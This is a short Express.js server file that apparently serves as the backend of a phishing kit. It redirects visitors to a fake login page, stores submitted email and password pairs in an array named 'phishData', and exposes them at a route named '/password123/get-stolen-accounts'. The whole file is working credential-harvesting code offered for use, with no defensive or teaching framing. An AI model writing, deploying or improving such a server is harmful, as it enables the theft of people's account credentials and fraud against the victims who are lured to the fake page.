const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('./public'));

const PORT = process.env.PORT || 5000;
let phishData = [];

app.get('/', (req, res) => {
    res.redirect('/login')
})

app.get('/password123/get-stolen-accounts', (req, res) => {
    res.send(phishData);
}) 
app.post('/store', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    phishData.push({
        email: email,
        password: password  
    })

    res.status(200).send({ success: true })
})

app.listen(PORT, console.log(`Server Active: TRUE
PORT: ${PORT}`));